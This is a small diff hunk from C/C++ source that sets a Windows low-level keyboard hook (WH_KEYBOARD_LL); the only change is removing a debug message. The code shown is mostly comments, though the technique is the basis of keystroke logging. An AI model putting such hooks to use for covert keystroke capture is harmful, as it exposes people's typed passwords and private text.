@@ -47,7 +47,6 @@ LRESULT __stdcall HookCallback(int nCode, WPARAM wParam, LPARAM lParam)
 void SetHook()
 {
 
-	OutputDebugStringA("Settin hook\n");
 	// Set the hook and set it to use the callback function above
 	// WH_KEYBOARD_LL means it will set a low level keyboard hook. More information about it at MSDN.
 	// The last 2 parameters are NULL, 0 because the callback function is in the same thread and window as the
